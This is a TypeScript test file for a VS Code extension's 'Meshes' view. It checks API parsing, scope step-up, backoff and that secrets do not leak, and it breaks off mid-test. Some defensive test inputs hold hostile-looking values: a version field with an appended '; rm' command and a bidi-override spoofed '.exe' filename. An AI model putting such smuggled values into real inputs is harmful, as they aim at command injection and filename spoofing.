// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 crossVault GmbH
// The "Meshes" view, against mock answers of GET /meshes and GET /me/mesh/cells in the pinned server
// contract (no server needed).
import * as assert from "assert";
import * as fs from "fs";
import * as path from "path";
import { calls, fakeMemento, fakeSecrets, resetCalls } from "../fakeVscode";
import * as ext from "../../extension";
import * as api from "../../api";
import { LoginRequest, SECRET_KEY } from "../../auth";
import {
  BACKOFF_CAP_MS, cellDescription, isMine, isolationText, oneLine, osText, safeScope, startable, statusText, cellTooltip, detect, isTierCWindows, lastSeenText, listMeshes, listMyCells, Machine, MAX_PAGES, Mesh,
  MESH_TEXTS, MeshLoader, meshesPageUrl, meshInviteUrl, meshLaunchArgs, meshPageUrl, meshTree, parseCell, parseMachine, parseMesh, POLL_MS,
  PROBE_RETRY_MS, retryAfterMs, suggestCellName, Timers, validateCellName, VisibilityPoller,
} from "../../meshApi";
import { CellItem, MachineItem, MeshItem, MESHES_AVAILABLE } from "../../meshesView";
import {
  parsePreflight, PREFLIGHT_FIX_LINES, PREFLIGHT_REASON_MAX, preflightAction, preflightArgs, reducedWarning,
} from "../../meshApi";
import { commandLine } from "../../terminalCommand";
import type { CliLookup } from "../../cli";

const TOKEN = "lib_tok_MESH_secret_456";
const NEW_TOKEN = "lib_tok_MESH_new_789";
const BASE = "https://session-exchange.com";
const NOW = Date.parse("2026-10-28T12:00:00Z");
const HOSTNAME = "build-box-07.corp.example";
const A = `msh_${"a".repeat(32)}`;
const B = `msh_${"b".repeat(32)}`;
const E = `msh_${"e".repeat(32)}`;
const OTHER = `msh_${"f".repeat(32)}`;
const OLD = `msh_${"0".repeat(32)}`;
const NM = `msh_${"9".repeat(32)}`;

// ---- fixtures: the pinned contract ----------------------------------------------------------------

const MESHES = { meshes: [
  { mesh_id: A, name: "Alpha team", role: "owner", status: "active", member_count_bucket: "2-5" },
  { mesh_id: B, name: "Beta", role: "member", status: "active", member_count_bucket: "1" },
  { mesh_id: E, name: "Empty mesh", role: "admin", status: "active", member_count_bucket: "1" },
  { mesh_id: OLD, name: "Old project", role: "owner", status: "archived", archived_at: "2026-10-20T08:00:00Z", member_count_bucket: "1" },
  { mesh_id: NM, name: "Public directory", status: "active", member_count_bucket: "50+" },
], next_cursor: null };

const cell = (over: Record<string, unknown>) => ({
  mesh_id: A, mesh_name: "Alpha team", instance_id: "i-1", name: "planner", isolation: "sandbox", status: "active", presence: "online",
  last_seen: "2026-10-28T11:55:00Z", reach: ["lan"], os: "linux", client_version: "0.12.3", ...over,
});

const CELLS = { machines: [
  {
    key_id: "k_laptop", label: `laptop (${HOSTNAME})`, binding: "pinned", created_at: "2026-10-01T00:00:00Z", expires_at: "2027-01-01T00:00:00Z", revoked: false,
    cells: [
      cell({}),
      cell({ instance_id: "i-2", name: "builder", status: "pending", presence: "offline", last_seen: "2026-10-28T11:20:00Z", reach: [] }),
      cell({ mesh_id: B, mesh_name: "Beta", instance_id: "i-3", name: "solo", isolation: "uid", reach: ["public", "via"], os: null, last_seen: null }),
    ],
  },
  {
    key_id: "k_win", label: "WIN-DESK", binding: "pairing", created_at: "2026-10-02T00:00:00Z", expires_at: "2026-11-02T00:00:00Z", revoked: false,
    cells: [cell({ instance_id: "i-4", name: "tester", isolation: "reduced", presence: "idle", last_seen: "2026-10-28T10:00:00Z", reach: ["via"], os: "windows", client_version: "0.12.2" })],
  },
  { key_id: "k_old", label: "old-host", binding: "pinned", revoked: true, cells: [cell({ mesh_id: B, instance_id: "i-5", name: "ghost", status: "revoked", revoked_reason: `stolen laptop at ${HOSTNAME}` })] },
  { key_id: "k_other", label: "elsewhere", binding: "pinned", revoked: false, cells: [cell({ mesh_id: OTHER, instance_id: "i-6", name: "hidden" })] },
], next_cursor: null };

const NOT_FOUND = { status: 404, body: { error: { code: "not_found", message: "no such route" } } };
const SCOPE_DENIED = { status: 403, body: { error: { code: "scope_denied", message: "needs mesh:read" } } };
const NEEDS_SIGNIN = { status: 409, body: { error: { code: "needs_signin", message: "open the website first" } } };
const ok = (body: unknown) => ({ status: 200, body });

// ---- harness --------------------------------------------------------------------------------------

interface Req { url: string; method: string; headers: Record<string, string> }
type Answer = { status: number; body?: unknown; retryAfter?: string } | Error | (() => Promise<{ status: number; body?: unknown }>);

function fakeFetch(routes: Record<string, Answer[]>) {
  const seen: Req[] = [];
  const fetch: api.FetchLike = async (url, init) => {
    const u = new URL(url);
    seen.push({ url, method: init?.method ?? "GET", headers: init?.headers ?? {} });
    const queue = routes[`${init?.method ?? "GET"} ${u.pathname}`];
    if (!queue || queue.length === 0) {
      throw new Error("unexpected request");
    }
    let next = queue.length > 1 ? queue.shift()! : queue[0];
    if (next instanceof Error) {
      throw next;
    }
    if (typeof next === "function") {
      next = await next();
    }
    const a = next as { status: number; body?: unknown; retryAfter?: string };
    return {
      status: a.status,
      json: async () => (a.body === undefined ? Promise.reject(new Error("no body")) : a.body),
      headers: { get: (n: string) => (n.toLowerCase() === "retry-after" ? a.retryAfter ?? null : null) },
    };
  };
  return { fetch, seen };
}

const paths = (seen: Req[]) => seen.map((r) => `${new URL(r.url).pathname}${new URL(r.url).search}`);
const clientWith = (fetch: api.FetchLike, base = BASE): api.Client => ({ base, fetch, userAgent: "a4sx-vscode" });
const found = (p: string) => (): CliLookup => ({ found: true, path: p });
const flush = async (n = 6) => { for (let i = 0; i < n; i++) { await new Promise((r) => setImmediate(r)); } };

/** Fake timers and a fake clock for MeshLoader and VisibilityPoller. */
function fakeClock(start = NOW) {
  let t = start;
  let id = 1;
  const timeouts = new Map<number, { fn: () => void; at: number; ms: number }>();
  const intervals = new Map<number, () => void>();
  const delays: number[] = [];
  const timers: Timers = {
    setInterval: (fn) => { intervals.set(id, fn); return id++; },
    clearInterval: (h) => { intervals.delete(h as number); },
    setTimeout: (fn, ms) => { delays.push(ms); timeouts.set(id, { fn, at: t + ms, ms }); return id++; },
    clearTimeout: (h) => { timeouts.delete(h as number); },
  };
  return {
    timers, timeouts, intervals, delays,
    now: () => t,
    /** Moves the clock and runs the timeouts that came due. */
    async advance(ms: number) {
      t += ms;
      for (const [k, v] of [...timeouts]) {
        if (v.at <= t) {
          timeouts.delete(k);
          v.fn();
        }
      }
      await flush();
    },
  };
}

function loaderWith(routes: Record<string, Answer[]>, opts: { base?: () => string; token?: string | undefined; tokenFn?: () => string | undefined } = {}) {
  const net = fakeFetch(routes);
  const clock = fakeClock();
  const log = { available: [] as boolean[], changed: 0, unauthorized: 0, unauthorizedWith: [] as string[] };
  const loader = new MeshLoader({
    client: () => clientWith(net.fetch, opts.base ? opts.base() : BASE),
    token: async () => (opts.tokenFn ? opts.tokenFn() : "token" in opts ? opts.token : TOKEN),
    unauthorized: async (t: string) => { log.unauthorized++; log.unauthorizedWith.push(t); },
    available: (v) => log.available.push(v),
    changed: () => { log.changed++; },
    now: clock.now,
    timers: clock.timers,
  });
  return { loader, net, clock, log };
}

async function activateWith(routes: Record<string, Answer[]>, scopes: string[] | null = ["library:read", "profiles:read", "library:organize", "mesh:read"]) {
  const net = fakeFetch(routes);
  ext.runtime.fetch = net.fetch;
  const logins: LoginRequest[] = [];
  ext.runtime.login = async (_c, req) => {
    logins.push(req);
    return { token: NEW_TOKEN, server: BASE, id: "t2", scopes: [...req.scopes] };
  };
  const ctx = { subscriptions: [] as { dispose(): unknown }[], secrets: fakeSecrets(), globalState: fakeMemento() };
  if (scopes) {
    await ctx.secrets.store(SECRET_KEY, JSON.stringify({ token: TOKEN, server: BASE, id: "t1", scopes }));
  }
  ext.activate(ctx as any);
  disposeLater = ctx;
  const sb = ext.sidebar!;
  await sb.meshes.probe();
  return { ctx, net, logins, sb };
}

const savedRuntime = { ...ext.runtime };
let disposeLater: { subscriptions: { dispose(): unknown }[] } | undefined;
afterEach(() => {
  Object.assign(ext.runtime, savedRuntime);
  disposeLater?.subscriptions.forEach((d) => d.dispose());
  disposeLater = undefined;
});

/** Nothing the extension shows outside the tree carries the key or a machine label. */
function nothingLeaked(): void {
  const shown = [
    ...calls.errors.map((e) => e.message), ...calls.infos, ...calls.warnings, ...calls.progress.flatMap((p) => p.messages),
    ...calls.terminals.flatMap((t) => [JSON.stringify(t.options), ...t.sent]), ...calls.opened, JSON.stringify(calls.context),
  ];
  for (const m of shown) {
    for (const secret of [TOKEN, NEW_TOKEN, HOSTNAME]) {
      assert.ok(!m.includes(secret), `leaked into a message, a terminal or a link: ${m}`);
    }
  }
}

/** The view, shown: the poll's first tick reads the cells. */
async function show() {
  calls.treeViews.get(ext.VIEW_MESHES)!.setVisible(true);
  await flush();
}

// ---- tests ----------------------------------------------------------------------------------------

describe("meshes: the pinned contract", () => {
  it("parses GET /meshes and GET /me/mesh/cells exactly, with the key as a Bearer header", async () => {
    const net = fakeFetch({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
    const c = clientWith(net.fetch);
    const paged = await listMeshes(c, TOKEN);
    assert.strictEqual(paged.truncated, false);
    const meshes = paged.items;
    assert.deepStrictEqual(meshes[0], { id: A, name: "Alpha team", role: "owner", status: "active", archivedAt: undefined, memberCountBucket: "2-5" });
    assert.deepStrictEqual(meshes.map((m) => [m.status, m.role]), [["active", "owner"], ["active", "member"], ["active", "admin"], ["archived", "owner"], ["active", undefined]]);
    assert.strictEqual(meshes[3].archivedAt, "2026-10-20T08:00:00Z");
    const machines = (await listMyCells(c, TOKEN)).items;
    assert.deepStrictEqual(machines.map((m) => [m.keyId, m.binding, m.revoked, m.cells.length]), [
      ["k_laptop", "pinned", false, 3], ["k_win", "pairing", false, 1], ["k_old", "pinned", true, 1], ["k_other", "pinned", false, 1],
    ]);
    assert.strictEqual(machines[0].expiresAt, "2027-01-01T00:00:00Z");
    assert.deepStrictEqual(machines[0].cells[0], {
      meshId: A, meshName: "Alpha team", instanceId: "i-1", name: "planner", isolation: "sandbox", status: "active", presence: "online",
      lastSeen: "2026-10-28T11:55:00Z", reach: ["lan"], os: "linux", clientVersion: "0.12.3",
    });
    assert.strictEqual(machines[0].cells[2].lastSeen, undefined, "last_seen null");
    assert.strictEqual(machines[0].cells[2].os, undefined, "os null from an older CLI");
    assert.ok(!JSON.stringify(machines).includes("stolen"), "revoked_reason is never kept");
    assert.ok(net.seen.every((r) => r.headers.Authorization === `Bearer ${TOKEN}`));
    assert.deepStrictEqual(paths(net.seen), ["/meshes", "/me/mesh/cells"]);
  });

  it("an enum value outside the contract shows as 'unknown': free text never shows as a kind", () => {
    const c = parseCell(cell({ presence: "WIN-DESK", status: HOSTNAME, isolation: "sandboxed", os: "10.0.0.7", reach: ["lan", "203.0.113.9:443", "lan"], client_version: "1.0; rm" }))!;
    assert.deepStrictEqual([c.presence, c.status, c.isolation, c.os, c.reach, c.clientVersion], ["unknown", "unknown", "unknown", "unknown", ["lan", "unknown"], undefined]);
    assert.deepStrictEqual(parseCell(cell({ reach: "lan" }))!.reach, ["unknown"]);
    assert.deepStrictEqual(parseCell(cell({ presence: "Online" }))!.presence, "unknown", "case matters");
    for (const p of ["online", "idle", "busy", "away", "offline"]) {
      assert.strictEqual(parseCell(cell({ presence: p }))!.presence, p);
    }
    assert.strictEqual(parseMachine({ key_id: "k", binding: "wifi" })!.binding, "unknown");
    const m = parseMesh({ mesh_id: A, role: "root", status: "frozen", member_count_bucket: "lots of people" })!;
    assert.deepStrictEqual([m.role, m.status, m.memberCountBucket], [undefined, "unknown", undefined]);
    assert.ok(!cellDescription(parseCell(cell({ presence: HOSTNAME, status: HOSTNAME, reach: [HOSTNAME] }))!, NOW).includes("corp"));
  });

  it("the pinned value lists: each listed value is kept, anything else is 'unknown'", () => {
    const keeps = (field: string, values: string[]) => {
      for (const v of values) {
        assert.strictEqual((parseCell(cell({ [field]: v })) as any)[field], v, `${field}=${v}`);
      }
      assert.strictEqual((parseCell(cell({ [field]: "other" })) as any)[field], "unknown", `${field}=other`);
    };
    keeps("status", ["active", "revoked", "pending"]);
    keeps("isolation", ["sandbox", "uid", "reduced"]);
    keeps("os", ["linux", "wsl", "windows"]);
    keeps("presence", ["online", "idle", "busy", "away", "offline"]);
    for (const other of ["Active", "LINUX", "uid ", "sandbox\u200b", HOSTNAME]) {
      assert.ok(Object.values(parseCell(cell({ status: other, isolation: other, os: other }))!).filter((v) => v === "unknown").length === 3, other);
    }
    assert.deepStrictEqual(parseCell(cell({ reach: ["lan", "public", "via", "wan"] }))!.reach, ["lan", "public", "via", "unknown"]);
    for (const b of ["pairing", "pinned"]) {
      assert.strictEqual(parseMachine({ key_id: "k", binding: b })!.binding, b);
    }
    for (const r of ["owner", "admin", "member"]) {
      assert.strictEqual(parseMesh({ mesh_id: A, role: r })!.role, r);
    }
    assert.strictEqual(parseMesh({ mesh_id: A })!.role, undefined, "no role for non-members");
    for (const st of ["active", "archived", "merged", "deleted"]) {
      assert.strictEqual(parseMesh({ mesh_id: A, status: st })!.status, st);
    }
  });

  it("os absent or null shows nothing (not 'unknown'); an unlisted os shows 'unknown'", () => {
    for (const os of [undefined, null]) {
      const c = parseCell(cell({ os }))!;
      assert.strictEqual(osText(c), undefined);
      assert.ok(!cellTooltip(c, parseMachine({ key_id: "k" })!, NOW).includes("OS:"));
    }
    assert.strictEqual(osText(parseCell(cell({ os: "beos" }))!), "unknown");
    assert.strictEqual(osText(parseCell(cell({ os: "wsl" }))!), "wsl");
  });

  it("pending shows as 'Waiting for approval'; isolation shows its tier, marked self-reported", () => {
    const pending = parseCell(cell({ status: "pending", presence: "offline", last_seen: null }))!;
    assert.strictEqual(statusText(pending), "Waiting for approval");
    assert.ok(cellDescription(pending, NOW).startsWith("Waiting for approval · "));
    assert.ok(cellTooltip(pending, parseMachine({ key_id: "k" })!, NOW).includes("Status: Waiting for approval"));
    assert.strictEqual(isolationText(parseCell(cell({ isolation: "sandbox" }))!), "tier a (sandbox), self-reported");
    assert.strictEqual(isolationText(parseCell(cell({ isolation: "uid" }))!), "tier b (uid), self-reported");
    assert.strictEqual(isolationText(parseCell(cell({ isolation: "reduced" }))!), "tier c (reduced), self-reported");
    assert.strictEqual(isolationText(parseCell(cell({ isolation: "none" }))!), "unknown");
  });

  it("archived means status 'archived' (no boolean); Start only in an active mesh of mine", () => {
    assert.strictEqual(parseMesh({ mesh_id: A, role: "owner", archived: true, status: "active" })!.status, "active", "an archived flag is ignored");
    assert.ok(!("archived" in parseMesh({ mesh_id: A, archived: true })!));
    for (const st of ["archived", "merged", "deleted", "frozen"]) {
      assert.strictEqual(startable(parseMesh({ mesh_id: A, role: "owner", status: st })!), false, st);
    }
    assert.strictEqual(startable(parseMesh({ mesh_id: A, role: "member", status: "active" })!), true);
    assert.strictEqual(startable(parseMesh({ mesh_id: A, status: "active" })!), false, "a non-member card");
    assert.strictEqual(isMine(parseMesh({ mesh_id: A, status: "active" })!), false);
  });

  it("oneLine strips C0/C1 controls, bidi overrides and isolates, and zero-width characters", () => {
    assert.strictEqual(oneLine("evil\u202egnp.exe"), "evilgnp.exe");
    assert.strictEqual(oneLine("a\u2066b\u2069c\u200bd\u200de\u2060f\ufeffg\u200fh\u061ci"), "abcdefghi");
    assert.strictEqual(oneLine("x\u0085y\u009bz\u0007w"), "x y z w");
    assert.strictEqual(oneLine("\u200b\u202e"), undefined);
    assert.strictEqual(parseMesh({ mesh_id: A, name: "Team\u202eA" })!.name, "TeamA");
  });

  it("a mesh id that isn't exactly msh_ + 32 hex is dropped (cards and cells); so is a machine without key_id", () => {
    for (const bad of ["m_alpha", `msh_${"A".repeat(32)}`, `msh_${"a".repeat(31)}`, `msh_${"a".repeat(33)}`, `${A}\n`, `x${A}`]) {
      assert.strictEqual(parseMesh({ mesh_id: bad }), undefined, bad);
      assert.strictEqual(parseCell(cell({ mesh_id: bad })), undefined, bad);
    }
    assert.strictEqual(parseMesh({ id: A }), undefined, "the contract's field is mesh_id");
    assert.strictEqual(parseMachine({ id: "k" }), undefined);
  });

  it("follows next_cursor (encoded) until it is null", async () => {
    const net = fakeFetch({ "GET /meshes": [
      ok({ meshes: [MESHES.meshes[0]], next_cursor: "c 2/x" }), ok({ meshes: [MESHES.meshes[1]], next_cursor: "c3" }), ok({ meshes: [MESHES.meshes[2]], next_cursor: null }),
    ] });
    assert.deepStrictEqual((await listMeshes(clientWith(net.fetch), TOKEN)).items.map((m) => m.id), [A, B, E]);
    assert.deepStrictEqual(paths(net.seen), ["/meshes", "/meshes?cursor=c%202%2Fx", "/meshes?cursor=c3"]);
  });

  it("stops at a repeated cursor, and after MAX_PAGES pages", async () => {
    const loop = fakeFetch({ "GET /me/mesh/cells": [ok({ machines: [], next_cursor: "same" })] });
    await listMyCells(clientWith(loop.fetch), TOKEN);
    assert.strictEqual(loop.seen.length, 2);
    let n = 0;
    const endless = fakeFetch({ "GET /meshes": [() => Promise.resolve(ok({ meshes: [], next_cursor: `c${n++}` }))] });
    const capped = await listMeshes(clientWith(endless.fetch), TOKEN);
    assert.strictEqual(endless.seen.length, MAX_PAGES);
    assert.strictEqual(capped.truncated, true);
    assert.strictEqual((await listMyCells(clientWith(loop.fetch), TOKEN)).truncated, false, "a repeated cursor isn't truncation");
  });

  it("a body that isn't the shape is 'bad-response'", async () => {
    const net = fakeFetch({ "GET /meshes": [ok([MESHES.meshes[0]])], "GET /me/mesh/cells": [ok({ cells: [] })] });
    await assert.rejects(listMeshes(clientWith(net.fetch), TOKEN), (e: any) => e.code === "bad-response");
    await assert.rejects(listMyCells(clientWith(net.fetch), TOKEN), (e: any) => e.code === "bad-response");
  });
});

describe("meshes: feature detection", () => {
  beforeEach(resetCalls);

  async function stateOf(answer: Answer) {
    const net = fakeFetch({ "GET /meshes": [answer] });
    return listMeshes(clientWith(net.fetch), TOKEN, () => NOW).then(() => ({ kind: "ok" }), detect);
  }

  it("404 is off, 409 needs_signin is needs-signin, others are errors", async () => {
    assert.deepStrictEqual(await stateOf(NOT_FOUND), { kind: "off" });
    assert.deepStrictEqual(await stateOf(NEEDS_SIGNIN), { kind: "needs-signin" });
    assert.deepStrictEqual(await stateOf({ status: 401 }), { kind: "error", message: api.MESSAGES.unauthorized, unauthorized: true, busy: false });
    assert.deepStrictEqual(await stateOf({ status: 500 }), { kind: "error", message: api.MESSAGES.http(500), unauthorized: false, busy: false });
    assert.deepStrictEqual(await stateOf(new Error("down")), { kind: "error", message: api.MESSAGES.unreachable, unauthorized: false, busy: false });
  });

  it("'Allow mesh read' only for 403 scope_denied naming no scope or mesh:read; any other named scope is a plain error", async () => {
    const needs = { kind: "needs-scope", scope: "mesh:read" };
    assert.deepStrictEqual(await stateOf(SCOPE_DENIED), needs);
    assert.deepStrictEqual(await stateOf({ status: 403, body: { error: { code: "scope_denied", details: { required_scope: "mesh:read" } } } }), needs);
    assert.deepStrictEqual(await stateOf({ status: 403, body: { error: { code: "insufficient_scope", details: { required_scope: "mesh:read" } } } }), needs);
    for (const other of ["mesh:join", "mesh:admin", "profiles:read"]) {
      assert.deepStrictEqual(await stateOf({ status: 403, body: { error: { code: "scope_denied", details: { required_scope: other } } } }),
        { kind: "denied", message: api.MESSAGES.needsScope(other) }, other);
    }
  });

  it("429/503 carry Retry-After (seconds or a date), capped at 5 minutes", async () => {
    assert.deepStrictEqual(await stateOf({ status: 429, retryAfter: "120" }), { kind: "error", message: api.MESSAGES.busy, unauthorized: false, busy: true, retryAfterMs: 120_000 });
    assert.deepStrictEqual(await stateOf({ status: 503 }), { kind: "error", message: api.MESSAGES.busy, unauthorized: false, busy: true });
    assert.strictEqual(retryAfterMs("3600", NOW), BACKOFF_CAP_MS);
    assert.strictEqual(retryAfterMs(new Date(NOW + 90_000).toUTCString(), NOW), 90_000);
    assert.strictEqual(retryAfterMs("soon", NOW), undefined);
    assert.strictEqual(retryAfterMs(undefined, NOW), undefined);
  });

  it("view: 404 on GET /meshes hides it (context key false) and shows nothing", async () => {
    const { sb } = await activateWith({ "GET /meshes": [NOT_FOUND] });
    assert.strictEqual(calls.context[MESHES_AVAILABLE], false);
    assert.deepStrictEqual(await sb.meshes.getChildren(), []);
  });

  it("view: signed out is hidden, with no request at all", async () => {
    const { sb, net } = await activateWith({}, null);
    assert.strictEqual(calls.context[MESHES_AVAILABLE], false);
    assert.deepStrictEqual(await sb.meshes.getChildren(), []);
    assert.strictEqual(net.seen.length, 0);
  });

  it("view: 403 scope_denied → 'Allow mesh read' runs the existing step-up for mesh:read; the view then loads", async () => {
    const { sb, logins, net } = await activateWith({
      "GET /meshes": [SCOPE_DENIED, ok(MESHES)],
      "GET /me/mesh/cells": [ok(CELLS)],
    }, ["library:read", "profiles:read", "library:organize"]);
    assert.strictEqual(calls.context[MESHES_AVAILABLE], true, "shown, so the user can allow it");
    const [item] = await sb.meshes.getChildren();
    assert.strictEqual(item.label, MESH_TEXTS.allowMeshRead);
    assert.deepStrictEqual(item.command, { command: ext.CMD_ALLOW_SCOPE, title: MESH_TEXTS.allowMeshRead, arguments: ["mesh:read"] });
    await calls.commands.get(ext.CMD_ALLOW_SCOPE)!("mesh:read");
    await flush();
    assert.strictEqual(logins.length, 1);
    assert.strictEqual(logins[0].adding, "mesh:read");
    assert.deepStrictEqual([...logins[0].scopes].sort(), ["library:organize", "library:read", "mesh:read", "profiles:read"]);
    await sb.meshes.refresh();
    assert.deepStrictEqual((await sb.meshes.getChildren()).map((i) => i.label), ["Alpha team", "Beta", "Empty mesh", "Old project"]);
    assert.strictEqual(net.seen.at(-1)!.headers.Authorization, `Bearer ${NEW_TOKEN}`, "the new key is used after the step-up");
    nothingLeaked();
  });

  it("a server's scope string is sanitised before it is shown", async () => {
    for (const bad of ["mesh:join\nClick here", "<b>x</b>", "mesh:\u202ejoin", "a".repeat(80), "a:b:c:d"]) {
      const st = await stateOf({ status: 403, body: { error: { code: "scope_denied", details: { required_scope: bad } } } });
      assert.deepStrictEqual(st, { kind: "denied", message: api.MESSAGES.needsScope("unknown") }, JSON.stringify(bad));
    }
    assert.strictEqual(safeScope("profiles:read"), "profiles:read");
  });

  it("view: a 403 naming mesh:join is an error item with Refresh, never a sign-in", async () => {
    const { sb, logins } = await activateWith({ "GET /meshes": [{ status: 403, body: { error: { code: "scope_denied", details: { required_scope: "mesh:join" } } } }] });
    const [item] = await sb.meshes.getChildren();
    assert.strictEqual(item.label, api.MESSAGES.needsScope("mesh:join"));
    assert.strictEqual(item.command!.command, ext.CMD_REFRESH_MESHES);
    await calls.commands.get(ext.CMD_ALLOW_SCOPE)!("mesh:join");
    await calls.commands.get(ext.CMD_ALLOW_SCOPE)!("mesh:admin");
    assert.strictEqual(logins.length, 0);
  });

  it("view: 409 needs_signin → 'Open in browser' opens the website's meshes page", async () => {
    const { sb } = await activateWith({ "GET /meshes": [NEEDS_SIGNIN] });
    assert.strictEqual(calls.context[MESHES_AVAILABLE], true);
    const items = await sb.meshes.getChildren();
    assert.deepStrictEqual(items.map((i) => i.label), [MESH_TEXTS.needsSignin, MESH_TEXTS.openInBrowser]);
    await calls.commands.get(items[1].command!.command)!();
    assert.deepStrictEqual(calls.opened, [`${BASE}/meshes`]);
  });

  it("rollout: GET /me/mesh/cells 404 while GET /meshes works shows the meshes with one line", async () => {
    const { sb } = await activateWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [NOT_FOUND] });
    await show();
    assert.strictEqual(calls.context[MESHES_AVAILABLE], true);
    const top = await sb.meshes.getChildren();
    assert.deepStrictEqual(top.map((i) => i.label), [MESH_TEXTS.cellsNotYet, "Alpha team", "Beta", "Empty mesh", "Old project"]);
    assert.strictEqual(top.filter((i) => i.label === MESH_TEXTS.cellsNotYet).length, 1, "one line, not one per mesh");
    assert.ok(top.slice(1).every((i) => i.collapsibleState === 0 && !String(i.description).includes("cell")));
  });

  it("view: when the 20-page cap cuts the list, one line says so (and opens the website)", async () => {
    let n = 0;
    const page = () => Promise.resolve(ok({ meshes: [MESHES.meshes[0]], next_cursor: `c${n++}` }));
    const { sb } = await activateWith({ "GET /meshes": [page] });
    const top = await sb.meshes.getChildren();
    assert.deepStrictEqual(top.filter((i) => i.label === MESH_TEXTS.truncated).length, 1);
    assert.strictEqual(top[0].label, MESH_TEXTS.truncated);
    assert.strictEqual(top[0].command!.command, ext.CMD_OPEN_MESHES);
  });

  it("401: the key is forgotten with one warning, as in My sessions, and the view hides", async () => {
    const { sb, ctx } = await activateWith({ "GET /meshes": [{ status: 401 }] });
    await flush();
    assert.strictEqual(await ctx.secrets.get(SECRET_KEY), undefined);
    assert.deepStrictEqual(calls.warnings, [MESH_TEXTS.signedOut]);
    assert.strictEqual(calls.context[MESHES_AVAILABLE], false);
    assert.strictEqual(sb.meshes.loader.retrying, false);
  });
});

describe("meshes: 401 and the stored key", () => {
  beforeEach(resetCalls);

  it("view: a poll's 401 on the old key after a step-up leaves the new key and warns nothing", async () => {
    let release: (v: { status: number; body?: unknown }) => void = () => undefined;
    const { sb, ctx } = await activateWith({
      "GET /meshes": [ok(MESHES), () => new Promise((r) => { release = r; }), ok(MESHES)],
      "GET /me/mesh/cells": [ok(CELLS)],
    });
    const poll = sb.meshes.refresh();
    await flush();
    const fresh = JSON.stringify({ token: NEW_TOKEN, server: BASE, id: "t2", scopes: ["library:read", "profiles:read", "library:organize", "mesh:read"] });
    await ctx.secrets.store(SECRET_KEY, fresh);
    release({ status: 401 });
    await poll;
    await flush();
    assert.strictEqual(await ctx.secrets.get(SECRET_KEY), fresh, "the stepped-up key survives");
    assert.deepStrictEqual(calls.warnings, []);
  });
});

describe("meshes: the loader", () => {
  it("fix 1: a failed probe at window open retries on its own (30 s → 5 min, 5 tries) until availability is decided", async () => {
    const { loader, net, clock, log } = loaderWith({ "GET /meshes": [new Error("down"), { status: 502 }, { status: 429, retryAfter: "200" }, ok(MESHES)] });
    await loader.probe();
    assert.strictEqual(loader.availability, undefined);
    assert.deepStrictEqual(log.available, [false], "undecided: hidden for now");
    assert.deepStrictEqual(clock.delays, [30_000]);
    await clock.advance(30_000);
    assert.deepStrictEqual(clock.delays, [30_000, 60_000]);
    await clock.advance(60_000);
    assert.deepStrictEqual(clock.delays, [30_000, 60_000, 200_000], "Retry-After beats the 120 s step");
    await clock.advance(200_000);
    assert.strictEqual(loader.availability, true);
    assert.strictEqual(log.available.at(-1), true);
    assert.strictEqual(loader.retrying, false);
    assert.strictEqual(net.seen.length, 4);
  });

  it("fix 1: the retries are bounded; a new sign-in (probe()) starts a fresh budget", async () => {
    const { loader, net, clock } = loaderWith({ "GET /meshes": [new Error("down")] });
    await loader.probe();
    for (const ms of PROBE_RETRY_MS) {
      await clock.advance(ms);
    }
    await clock.advance(3_600_000);
    assert.deepStrictEqual(clock.delays, [...PROBE_RETRY_MS]);
    assert.strictEqual(net.seen.length, 1 + PROBE_RETRY_MS.length);
    assert.strictEqual(loader.retrying, false);
    await loader.probe();
    assert.strictEqual(loader.retrying, true);
  });

  it("fix 1: once decided, a later failure keeps the view and shows an error item; no retry loop", async () => {
    const { loader, clock, log } = loaderWith({ "GET /meshes": [ok(MESHES), new Error("down")] });
    await loader.probe();
    await loader.probe();
    assert.strictEqual(loader.availability, true);
    assert.strictEqual(log.available.at(-1), true);
    assert.strictEqual(loader.load!.kind, "error");
    assert.strictEqual(clock.timeouts.size, 0);
  });

  it("fix 3: the probe reads GET /meshes only; the cells are read on the first tick (show) or expand", async () => {
    const { loader, net } = loaderWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
    await loader.probe();
    assert.deepStrictEqual(paths(net.seen), ["/meshes"]);
    assert.deepStrictEqual((loader.load as any).cells, "pending");
    await loader.ensureCells();
    assert.deepStrictEqual(paths(net.seen), ["/meshes", "/meshes", "/me/mesh/cells"]);
    await loader.ensureCells();
    assert.strictEqual(net.seen.length, 3, "known cells are not read again on expand");
  });

  it("fix 3: a tick is skipped when the last full load is under 5 s old", async () => {
    const { loader, net, clock } = loaderWith({ "GET /meshes": [ok(MESHES)], "GET /me/mesh/cells": [ok(CELLS)] });
    await loader.tick();
    assert.strictEqual(net.seen.length, 2);
    await clock.advance(4_000);
    await loader.tick();
    assert.strictEqual(net.seen.length, 2);
    await clock.advance(1_500);
    await loader.tick();
    assert.strictEqual(net.seen.length, 4);
  });

  it("fix 4: on 429/503 the poll backs off (doubling, Retry-After honoured, capped at 5 min); Refresh still works", async () => {
    const { loader, net, clock } = loaderWith({
      "GET /meshes": [{ status: 429, retryAfter: "120" }, { status: 503 }, { status: 429, retryAfter: "86400" }, ok(MESHES)],
      "GET /me/mesh/cells": [ok(CELLS)],
    });
    await loader.tick();
    assert.strictEqual(net.seen.length, 1);
    await clock.advance(POLL_MS);
    await loader.tick();
    assert.strictEqual(net.seen.length, 1, "inside Retry-After: skipped");
    await clock.advance(120_000 - POLL_MS);
    await loader.tick();
    assert.strictEqual(net.seen.length, 2, "503 without Retry-After: second backoff, 60 s");
    await clock.advance(59_000);
    await loader.tick();
    assert.strictEqual(net.seen.length, 2);
    await clock.advance(1_000);
    await loader.tick();
    assert.strictEqual(net.seen.length, 3, "a day's Retry-After is capped at 5 min");
    await clock.advance(BACKOFF_CAP_MS - 1);
    await loader.tick();
    assert.strictEqual(net.seen.length, 3);
    await loader.full(true);
    assert.strictEqual(net.seen.length, 5, "Refresh ignores the backoff");
    assert.strictEqual(loader.load!.kind, "ok");
  });

  it("fix 5: an answer that arrives after the server URL changed is dropped", async () => {
    let base = BASE;
    let release: (v: { status: number; body?: unknown }) => void = () => undefined;
    const { loader, log } = loaderWith({ "GET /meshes": [() => new Promise((r) => { release = r; }), ok({ meshes: [], next_cursor: null })] }, { base: () => base });
    const first = loader.probe();
    await flush();
    base = "https://other.example.com";
    release(ok(MESHES));
    await first;
    assert.strictEqual(loader.load, undefined, "the old server's answer is not shown");
